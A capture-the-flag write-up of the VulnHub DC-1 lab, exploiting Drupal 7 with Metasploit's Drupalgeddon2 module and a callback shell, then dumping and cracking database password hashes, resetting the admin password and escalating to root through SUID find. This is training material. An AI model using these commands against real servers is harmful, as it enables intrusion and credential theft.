@@ -1,0 +1,311 @@
+# DC-1 — VulnHub CTF Writeup
+
+![Platform](https://img.shields.io/badge/Platform-VulnHub-blue) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-orange) ![Status](https://img.shields.io/badge/Status-Pwned%20%F0%9F%8F%86-brightgreen)
+
+## Machine Info
+
+| Field | Details |
+|---|---|
+| Platform | VulnHub |
+| Difficulty | Easy |
+| OS | Linux Debian |
+| IP | 10.0.2.15 |
+| CMS | Drupal 7 |
+| Flags | 5 |
+| Date Completed | May 21, 2026 |
+
+---
+
+## Summary
+
+DC-1 is a beginner-friendly Drupal machine. The attack chain involves exploiting the Drupalgeddon2 RCE vulnerability (CVE-2018-7600) via Metasploit to get an initial shell, enumerating the Drupal config file to find MySQL credentials, extracting and cracking password hashes, updating the admin password, logging into Drupal, and finally escalating to root via a SUID `find` binary.
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|---|---|
+| Nmap | Port scanning and service detection |
+| netdiscover | Host discovery |
+| Metasploit | Drupalgeddon2 RCE exploit |
+| MySQL | Database enumeration |
+| John the Ripper | Password hash cracking |
+| Hashcat | Password hash cracking |
+| find (SUID) | Privilege escalation |
+
+---
+
+## Enumeration
+
+### Step 1 — Host Discovery
+
+```bash
+sudo netdiscover -r 10.0.2.0/24
+```
+
+Target identified at `10.0.2.15`.
+
+### Step 2 — Port Scanning
+
+```bash
+nmap -sV -sC 10.0.2.15
+```
+
+**Results:**
+
+```
+PORT    STATE  SERVICE  VERSION
+22/tcp  open   ssh      OpenSSH 6.0p1 Debian 4+deb7u7
+80/tcp  open   http     Apache httpd 2.2.22 (Debian)
+111/tcp open   rpcbind  2-4 (RPC #100000)
+```
+
+Key findings from nmap:
+- `http-robots.txt` — 36 disallowed entries
+- `http-generator` — Drupal 7
+- `http-title` — Welcome to Drupal Site
+
+### Step 3 — Web Enumeration
+
+Visiting `http://10.0.2.15` revealed a **Drupal 7** CMS installation. Checked `robots.txt` which confirmed many Drupal-specific paths.
+
+Searched for known Drupal exploits:
+
+```
+searchsploit drupal
+```
+
+Found **Drupalgeddon2** — a critical Remote Code Execution vulnerability affecting Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1.
+
+---
+
+## Exploitation
+
+### Drupalgeddon2 RCE via Metasploit (CVE-2018-7600)
+
+```bash
+msfconsole
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 10.0.2.15
+set LHOST 10.0.2.4
+set LPORT 4444
+run
+```
+
+Successfully obtained a **www-data shell**:
+
+```
+www-data@DC-1:/var/www/profiles$
+```
+
+---
+
+## Flag 1
+
+**Location:** `/var/www/flag1.txt`
+
+```bash
+cd /var/www
+cat flag1.txt
+# Every good CMS needs a config file - and so do you.
+```
+
+The hint points to the Drupal config file.
+
+---
+
+## Flag 2
+
+**Location:** `/var/www/sites/default/settings.php`
+
+```bash
+cd /var/www/sites/default
+cat settings.php
+```
+
+Found **Flag 2** in the settings file along with database credentials:
+
+```php
+'database' => 'drupaldb',
+'username' => 'dbuser',
+'password' => 'R0ck3t',
+'host'     => 'localhost',
+'driver'   => 'mysql',
+```
+
+> *"Brute force and dictionary attacks aren't the only ways to gain access. What can you do with these credentials?"*
+
+---
+
+## Database Enumeration
+
+Used the discovered MySQL credentials to extract password hashes:
+
+```bash
+mysql -u dbuser -pR0ck3t -e "select name,pass from users;" drupaldb
+```
+
+**Extracted hashes:**
+
+```
+admin  |  $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
+Fred   |  $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
+```
+
+---
+
+## Hash Cracking
+
+### Method 1 — John the Ripper
+
+```bash
+nano hash.txt   # paste the admin hash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt
+```
+
+John was slow on Drupal7 hashes. Tried hashcat instead.
+
+### Method 2 — Hashcat
+
+```bash
+hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+Hash cracking was slow. Used an alternative approach — **reset the password directly via MySQL**:
+
+```bash
+# Generate new Drupal hash
+php scripts/password-hash.sh hacked123
+# Output hash: $S$DrT/k6PH2EJK1HL1NrL7eMK.YTZxYIEpyKX5KHxBQK3kX2GPIKRk
+
+# Update admin password in database
+mysql -u dbuser -pR0ck3t -e "update users set pass='\$S\$DrT/...' where name='admin';" drupaldb
+```
+
+**Admin credentials set:**
+- Username: `admin`
+- Password: `hacked123`
+
+---
+
+## Flag 3
+
+Logged into Drupal admin panel at `http://10.0.2.15/user` with `admin:hacked123`.
+
+**Location:** Drupal content page — `flag3`
+
+> *"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."*
+
+The hint: use `find` with SUID permissions and `-exec`.
+
+---
+
+## Flag 4
+
+**Location:** `/home/flag4/flag4.txt`
+
+```bash
+cd /home
+ls
+# flag4
+cd flag4
+cat flag4.txt
+# Can you use this same method to find or access the flag in root?
+# Probably. But perhaps it's not that easy. Or maybe it is?
+```
+
+---
+
+## Privilege Escalation
+
+### SUID find Binary
+
+Flag 3 hinted at `find` with special permissions. Checked for SUID binaries:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Found `/usr/bin/find` with SUID bit set. Using the [GTFOBins](https://gtfobins.github.io/gtfobins/find/) technique:
+
+```bash
+find /var/www -exec "/bin/sh" \;
+```
+
+Root shell obtained!
+
+```
+# whoami
+root
+```
+
+---
+
+## Final Flag
+
+**Location:** `/root/thefinalflag.txt`
+
+```bash
+cd /root
+ls
+cat thefinalflag.txt
+# Well done!!!!
+# Hopefully you've enjoyed this and learned some new skills.
+```
+
+---
+
+## Flags Summary
+
+| Flag | Location | Method |
+|---|---|---|
+| Flag 1 | `/var/www/flag1.txt` | Initial shell via Drupalgeddon2 |
+| Flag 2 | `/var/www/sites/default/settings.php` | Config file enumeration |
+| Flag 3 | Drupal content page (as admin) | MySQL password reset → Drupal login |
+| Flag 4 | `/home/flag4/flag4.txt` | Shell enumeration |
+| Final Flag | `/root/thefinalflag.txt` | SUID find → root shell |
+
+---
+
+## Attack Chain
+
+```
+Nmap (service detection → Drupal 7)
+    ↓
+Metasploit — Drupalgeddon2 RCE (CVE-2018-7600)
+    ↓
+www-data shell → Flag 1
+    ↓
+settings.php → MySQL creds → Flag 2
+    ↓
+MySQL → extract hashes → reset admin password
+    ↓
+Drupal admin login → Flag 3
+    ↓
+Flag 4 (/home/flag4/)
+    ↓
+SUID find → GTFOBins → root shell
+    ↓
+🏆 Final flag captured
+```
+
+---
+
+## Key Takeaways
+
+- Always check the **CMS version** — outdated CMS installations are a goldmine for exploits
+- **Config files** often contain database credentials — always look for `settings.php`, `config.php`, `wp-config.php`
+- If hash cracking is too slow, **reset the password directly** in the database
+- Always check for **SUID binaries** with `find / -perm -u=s -type f 2>/dev/null`
+- Check [GTFOBins](https://gtfobins.github.io) for any SUID binary you find
+
+---
+
+## References
+
+- [VulnHub DC-1](https://www.vulnhub.com/entry/dc-1,292/)
+- [Drupalgeddon2 — CVE-2018-7600](https://www.exploit-db.com/exploits/44449)
+- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
+- [Metasploit drupal_drupalgeddon2](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)
